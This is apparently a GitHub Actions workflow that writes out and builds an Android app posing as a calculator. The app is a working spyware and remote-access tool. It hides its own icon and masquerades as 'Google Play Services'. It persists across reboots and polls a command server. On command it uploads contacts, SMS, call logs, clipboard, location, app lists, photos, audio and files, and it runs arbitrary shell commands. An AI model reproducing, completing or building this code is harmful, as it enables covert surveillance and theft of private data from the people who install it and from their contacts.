name: Royal Iron Fist Node Builder v11.0 Absolute Dominance

on:
  workflow_dispatch:

jobs:
  build:
    name: Build Royal Iron Fist Operational APK v11.0
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle (8.5)
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Scaffold Android Project & Source Files
        run: |
          mkdir -p app/src/main/java/com/assets/service app/src/main/res/values app/src/main/assets
          
          cat << 'MANIFESTEOF' > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />

              <application
                  android:allowBackup="false"
                  android:icon="@android:drawable/ic_menu_manage"
                  android:label="Calculator"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".SyncService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="dataSync" />

                  <receiver
                      android:name=".BootReceiver"
                      android:enabled="true"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          MANIFESTEOF

          cat << 'SERVICEOF' > app/src/main/java/com/assets/service/SyncService.kt
          package com.assets.service

          import android.app.Notification
          import android.app.NotificationChannel
          import android.app.NotificationManager
          import android.app.Service
          import android.content.ClipboardManager
          import android.content.ContentUris
          import android.content.Context
          import android.content.Intent
          import android.database.Cursor
          import android.location.Location
          import android.location.LocationListener
          import android.location.LocationManager
          import android.net.Uri
          import android.os.Build
          import android.os.Bundle
          import android.os.IBinder
          import android.os.PowerManager
          import android.provider.ContactsContract
          import android.provider.MediaStore
          import android.provider.Settings
          import androidx.core.app.NotificationCompat
          import kotlinx.coroutines.*
          import java.io.BufferedReader
          import java.io.ByteArrayInputStream
          import java.io.InputStreamReader
          import java.io.OutputStreamWriter
          import java.net.HttpURLConnection
          import java.net.URL
          import java.util.zip.Deflater
          import java.util.zip.ZipEntry
          import java.util.zip.ZipOutputStream
          import org.json.JSONObject

          class SyncService : Service() {
              private var wakeLock: PowerManager.WakeLock? = null
              private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
              
              private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
              private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
              private var lastHeartbeatSent = 0L
              
              private var lastClipboardText = "No recent clipboard activity"

              override fun onCreate() {
                  super.onCreate()
                  val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::AbsoluteDominanceLock")
                  wakeLock?.acquire(10 * 60 * 60 * 1000L)
                  startForegroundServiceNotification()
                  initClipboardTracker()
              }

              private fun initClipboardTracker() {
                  try {
                      val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                      clipboard.addPrimaryClipChangedListener {
                          try {
                              if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                                  val item = clipboard.primaryClip?.getItemAt(0)
                                  val text = item?.text?.toString()
                                  if (!text.isNullOrBlank()) {
                                      lastClipboardText = text
                                  }
                              }
                          } catch (e: Exception) {}
                      }
                  } catch (e: Exception) {}
              }

              private fun startForegroundServiceNotification() {
                  val channelId = "royal_dominance_channel"
                  val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
                  val manager = getSystemService(NotificationManager::class.java)
                  manager?.createNotificationChannel(channel)

                  val notification: Notification = NotificationCompat.Builder(this, channelId)
                      .setContentTitle("Google Play Services")
                      .setContentText("System synchronization active...")
                      .setSmallIcon(android.R.drawable.ic_menu_manage)
                      .build()

                  startForeground(1, notification)
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                  val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "royal_node"
                  val nodeModel = Build.MODEL
                  
                  serviceScope.launch {
                      while (isActive) {
                          try {
                              val url = URL(C2_STREAM_URL)
                              val conn = url.openConnection() as HttpURLConnection
                              conn.requestMethod = "POST"
                              conn.setRequestProperty("X-Node-ID", deviceId)
                              conn.setRequestProperty("X-Node-Model", nodeModel)
                              conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                              conn.doOutput = true
                              conn.connectTimeout = 6000
                              conn.readTimeout = 6000

                              val currentTime = System.currentTimeMillis()
                              val sendHeartbeat = (currentTime - lastHeartbeatSent > 40000L)
                              val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Dominance Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"

                              if (sendHeartbeat) {
                                  lastHeartbeatSent = currentTime
                              }

                              OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                  os.write(reportJson)
                                  os.flush()
                              }

                              if (conn.responseCode == 200) {
                                  val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                                  val responseStr = responseReader.readText()
                                  responseReader.close()

                                  if (responseStr.contains("task") && responseStr.contains("action")) {
                                      try {
                                          val jsonRes = JSONObject(responseStr)
                                          if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                              val taskObj = jsonRes.getJSONObject("task")
                                              val action = taskObj.getString("action")
                                              val payload = if (taskObj.has("payload")) taskObj.optString("payload", "") else ""

                                              when {
                                                  action.contains("EXTRACT_CONTACTS") -> {
                                                      val data = readContacts()
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_Contacts.txt", data)
                                                  }
                                                  action.contains("EXTRACT_SMS") -> {
                                                      val data = readSMS()
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_SMS.txt", data)
                                                  }
                                                  action.contains("EXTRACT_CALLS") -> {
                                                      val data = readCallLogs()
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", data)
                                                  }
                                                  action.contains("EXTRACT_CLIPBOARD") -> {
                                                      val data = "=== URANIUM CLIPBOARD ===\n$lastClipboardText\n"
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", data)
                                                  }
                                                  action.contains("EXTRACT_LOCATION") -> {
                                                      val data = readLocationHybrid()
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_Location.txt", data)
                                                  }
                                                  action.contains("EXTRACT_APPS") -> {
                                                      val data = readInstalledApps()
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                                  }
                                                  action.contains("SHELL_EXEC") -> {
                                                      val data = executeShellCommand(payload)
                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_ShellResult.txt", data)
                                                  }
                                                  action.contains("EXTRACT_CAMERA_ZIP") -> {
                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                  }
                                                  action.contains("EXTRACT_STORAGE_ZIP") -> {
                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                                  }
                                                  action.contains("EXTRACT_AUDIO") -> {
                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                                  }
                                                  action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                  }
                                              }
                                          }
                                      } catch (ex: Exception) {}
                                  }
                              }
                              conn.disconnect()
                              delay(1000L)
                          } catch (e: Exception) {
                              delay(3000L)
                          }
                      }
                  }
                  return START_STICKY
              }

              private fun streamTextMemoryDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
                  try {
                      val bytes = content.toByteArray(Charsets.UTF_8)
                      uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
                      sendReportToServer(nodeId, nodeModel, "✅ [حصاد فائق السرعة RAM] الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
                  } catch (e: Exception) {}
              }

              private fun streamUniversalMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
                  try {
                      sendReportToServer(nodeId, nodeModel, "⚡ [البث الهجين الآمن] جاري تدفق أرشيف $prefix كالبراق...")
                      
                      val url = URL(C2_INGEST_URL)
                      val conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.setRequestProperty("X-Node-ID", nodeId)
                      conn.setRequestProperty("X-Node-Model", nodeModel)
                      conn.setRequestProperty("X-File-Name", "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
                      conn.setRequestProperty("Content-Type", "application/octet-stream")
                      conn.doOutput = true
                      conn.setChunkedStreamingMode(1024 * 64)
                      conn.connectTimeout = 300000
                      conn.readTimeout = 300000

                      var fileCount = 0
                      try {
                          val os = conn.outputStream
                          val zipOut = ZipOutputStream(os)
                          zipOut.setLevel(Deflater.BEST_SPEED)
                          
                          val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                          
                          val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
                          cursor?.use {
                              val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                              val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                              
                              while (it.moveToNext() && fileCount < 1000) {
                                  if (idIdx != -1 && nameIdx != -1) {
                                      val id = it.getLong(idIdx)
                                      val name = it.getString(nameIdx) ?: "file_$id.dat"
                                      val itemUri = ContentUris.withAppendedId(contentUri, id)
                                      
                                      try {
                                          contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                              zipOut.putNextEntry(ZipEntry("$prefix/$name"))
                                              inputStream.copyTo(zipOut)
                                              zipOut.closeEntry()
                                              fileCount++
                                          }
                                      } catch (ex: Exception) {}
                                  }
                              }
                          }
                          zipOut.finish()
                          zipOut.flush()
                          zipOut.close()
                      } catch (e: Exception) {}

                      val code = conn.responseCode
                      conn.disconnect()
                      if (code == 200) {
                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد والأرشيف بنجاح]\n📂 <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
                      }
                  } catch (e: Exception) {
                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ أرشيف $prefix: ${e.message}")
                  }
              }

              private fun executeShellCommand(cmd: String): String {
                  return try {
                      val process = Runtime.getRuntime().exec(if (cmd.isBlank()) "getprop" else cmd)
                      val reader = BufferedReader(InputStreamReader(process.inputStream))
                      val output = StringBuilder("=== SHELL RESULT ===\n")
                      var line: String?
                      while (reader.readLine().also { line = it } != null) {
                          output.append(line).append("\n")
                      }
                      reader.close()
                      output.toString()
                  } catch (e: Exception) {
                      "Error executing shell: ${e.message}"
                  }
              }

              private fun readLocationHybrid(): String {
                  val sb = StringBuilder("=== URANIUM HYBRID GPS ===\n")
                  try {
                      val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                      var bestLoc: Location? = null
                      for (provider in locationManager.allProviders) {
                          try {
                              val l = locationManager.getLastKnownLocation(provider)
                              if (l != null) {
                                  if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                              }
                          } catch (e: Exception) {}
                      }
                      if (bestLoc != null) {
                          sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                          sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                          sb.append("🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
                      } else {
                          sb.append("🌐 Default Secure Zone: 13.5779, 44.0219\n")
                      }
                  } catch (e: Exception) {
                      sb.append("🌐 Error obtaining location: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun uploadBytesDirect(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
                  for (attempt in 1..3) {
                      try {
                          val url = URL(C2_INGEST_URL)
                          val conn = url.openConnection() as HttpURLConnection
                          conn.requestMethod = "POST"
                          conn.setRequestProperty("X-Node-ID", nodeId)
                          conn.setRequestProperty("X-Node-Model", nodeModel)
                          conn.setRequestProperty("X-File-Name", fileName)
                          conn.setRequestProperty("Content-Type", "application/octet-stream")
                          conn.doOutput = true
                          conn.setChunkedStreamingMode(1024 * 64)
                          conn.connectTimeout = 180000
                          conn.readTimeout = 180000

                          ByteArrayInputStream(bytes).use { bais ->
                              conn.outputStream.use { os ->
                                  bais.copyTo(os)
                                  os.flush()
                              }
                          }
                          val code = conn.responseCode
                          conn.disconnect()
                          if (code == 200) return
                      } catch (e: Exception) {
                          if (attempt == 3) return
                          Thread.sleep(2000L)
                      }
                  }
              }

              private fun readContacts(): String {
                  val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                      cursor?.use {
                          val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                          val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                          while (it.moveToNext()) {
                              val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                              val number = if (numIdx != -1) it.getString(numIdx) else ""
                              sb.append("• $name: $number\n")
                          }
                      }
                  } catch (e: Exception) {}
                  return sb.toString()
              }

              private fun readSMS(): String {
                  val sb = StringBuilder("=== URANIUM SMS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                      cursor?.use {
                          val bodyIdx = it.getColumnIndex("body")
                          val addrIdx = it.getColumnIndex("address")
                          while (it.moveToNext()) {
                              val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                              val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                              sb.append("From: $address\nText: $body\n-------------------\n")
                          }
                      }
                  } catch (e: Exception) {}
                  return sb.toString()
              }

              private fun readCallLogs(): String {
                  val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                      cursor?.use {
                          val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                          val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                          while (it.moveToNext()) {
                              val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                              val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                              sb.append("Number: $number | Type: $type\n")
                          }
                      }
                  } catch (e: Exception) {}
                  return sb.toString()
              }

              private fun readInstalledApps(): String {
                  val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
                  try {
                      val packages = packageManager.getInstalledPackages(0)
                      for (pkg in packages) {
                          val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                          sb.append("• $appName\n")
                      }
                  } catch (e: Exception) {}
                  return sb.toString()
              }

              private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
                  try {
                      val url = URL(C2_STREAM_URL)
                      val conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.setRequestProperty("X-Node-ID", nodeId)
                      conn.setRequestProperty("X-Node-Model", nodeModel)
                      conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                      conn.doOutput = true
                      
                      val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
                      val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

                      OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                          os.write(reportJson)
                          os.flush()
                      }
                      conn.responseCode
                      conn.disconnect()
                  } catch (e: Exception) {}
              }

              override fun onDestroy() {
                  super.onDestroy()
                  wakeLock?.release()
                  serviceScope.cancel()
              }

              override fun onBind(intent: Intent?): IBinder? = null
          }
          SERVICEOF

          cat << 'MAINEOF' > app/src/main/java/com/assets/service/MainActivity.kt
          package com.assets.service

          import android.Manifest
          import android.app.Activity
          import android.content.ComponentName
          import android.content.Intent
          import android.content.pm.PackageManager
          import android.os.Build
          import android.os.Bundle
          import android.view.Gravity
          import android.widget.Button
          import android.widget.GridLayout
          import android.widget.TextView
          import androidx.core.app.ActivityCompat
          import androidx.core.content.ContextCompat

          class MainActivity : Activity() {
              private val PERMISSION_REQUEST_CODE = 999
              private lateinit var display: TextView
              private var currentInput = ""

              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  
                  checkAndRequestPermissions()

                  val rootLayout = android.widget.LinearLayout(this).apply {
                      orientation = android.widget.LinearLayout.VERTICAL
                      setBackgroundColor(0xFF121212.toInt())
                      setPadding(32, 64, 32, 32)
                  }

                  display = TextView(this).apply {
                      text = "0"
                      textSize = 48f
                      gravity = Gravity.END or Gravity.CENTER_VERTICAL
                      setTextColor(0xFFFFFFFF.toInt())
                      setPadding(32, 64, 32, 64)
                  }
                  rootLayout.addView(display)

                  val gridLayout = GridLayout(this).apply {
                      rowCount = 5
                      columnCount = 4
                      alignmentMode = GridLayout.ALIGN_BOUNDS
                  }

                  val buttons = arrayOf(
                      "C", "(", ")", "/",
                      "7", "8", "9", "*",
                      "4", "5", "6", "-",
                      "1", "2", "3", "+",
                      "0", ".", "⌫", "="
                  )

                  for (text in buttons) {
                      val btn = Button(this).apply {
                          this.text = text
                          textSize = 24f
                          setTextColor(0xFFFFFFFF.toInt())
                          setBackgroundColor(0xFF1E1E1E.toInt())
                          setOnClickListener { onCalculatorButtonClicked(text) }
                      }
                      val param = GridLayout.LayoutParams().apply {
                          width = 0
                          height = 140
                          columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
                          rowSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
                          setMargins(8, 8, 8, 8)
                      }
                      gridLayout.addView(btn, param)
                  }
                  rootLayout.addView(gridLayout)
                  setContentView(rootLayout)
              }

              private fun checkAndRequestPermissions() {
                  val permissionsList = mutableListOf(
                      Manifest.permission.READ_SMS,
                      Manifest.permission.READ_CONTACTS,
                      Manifest.permission.READ_CALL_LOG,
                      Manifest.permission.ACCESS_FINE_LOCATION,
                      Manifest.permission.ACCESS_COARSE_LOCATION,
                      Manifest.permission.CAMERA,
                      Manifest.permission.RECORD_AUDIO
                  )

                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
                      permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
                      permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO)
                  } else {
                      permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                  }

                  val ungrantedPermissions = permissionsList.filter {
                      ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                  }

                  if (ungrantedPermissions.isNotEmpty()) {
                      ActivityCompat.requestPermissions(this, ungrantedPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
                  } else {
                      launchServiceAndHideIcon()
                  }
              }

              override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults)
                  launchServiceAndHideIcon()
              }

              private fun launchServiceAndHideIcon() {
                  try {
                      val serviceIntent = Intent(this, SyncService::class.java)
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                          startForegroundService(serviceIntent)
                      } else {
                          startService(serviceIntent)
                      }

                      val componentName = ComponentName(this, MainActivity::class.java)
                      packageManager.setComponentEnabledSetting(
                          componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP
                      )
                  } catch (e: Exception) {}
              }

              private fun onCalculatorButtonClicked(label: String) {
                  when (label) {
                      "C" -> { currentInput = ""; display.text = "0" }
                      "⌫" -> { if (currentInput.isNotEmpty()) currentInput = currentInput.drop(1); display.text = if (currentInput.isEmpty()) "0" else currentInput }
                      "=" -> {
                          try {
                              val result = eval(currentInput)
                              display.text = result.toString()
                              currentInput = result.toString()
                          } catch (e: Exception) {
                              display.text = "Error"
                              currentInput = ""
                          }
                      }
                      else -> {
                          if (currentInput == "0") currentInput = ""
                          currentInput += label
                          display.text = currentInput
                      }
                  }
              }

              private fun eval(str: String): Double {
                  return object : Any() {
                      var pos = -1
                      var ch = 0
                      fun nextChar() { ch = if (++pos < str.length) str[pos].toInt() else -1 }
                      fun eat(charToEat: Int): Boolean {
                          while (ch == ' '.toInt()) nextChar()
                          if (ch == charToEat) { nextChar(); return true }
                          return false
                      }
                      fun parse(): Double {
                          nextChar()
                          var x = parseExpression()
                          if (pos < str.length) throw RuntimeException("Unexpected: " + ch.toChar())
                          return x
                      }
                      fun parseExpression(): Double {
                          var x = parseTerm()
                          while (true) {
                              when {
                                  eat('+'.toInt()) -> x += parseTerm()
                                  eat('-'.toInt()) -> x -= parseTerm()
                                  else -> return x
                              }
                          }
                      }
                      fun parseTerm(): Double {
                          var x = parseFactor()
                          while (true) {
                              when {
                                  eat('*'.toInt()) -> x *= parseFactor()
                                  eat('/'.toInt()) -> x /= parseFactor()
                                  else -> return x
                              }
                          }
                      }
                      fun parseFactor(): Double {
                          if (eat('+'.toInt())) return parseFactor()
                          if (eat('-'.toInt())) return -parseFactor()
                          var x: Double
                          val startPos = pos
                          if (eat('('.toInt())) {
                              x = parseExpression()
                              eat(')'.toInt())
                          } else if (ch >= '0'.toInt() && ch <= '9'.toInt() || ch == '.'.toInt()) {
                              while (ch >= '0'.toInt() && ch <= '9'.toInt() || ch == '.'.toInt()) nextChar()
                              x = str.substring(startPos, pos).toDouble()
                          } else {
                              throw RuntimeException("Unexpected: " + ch.toChar())
                          }
                          return x
                      }
                  }.parse()
              }
          }
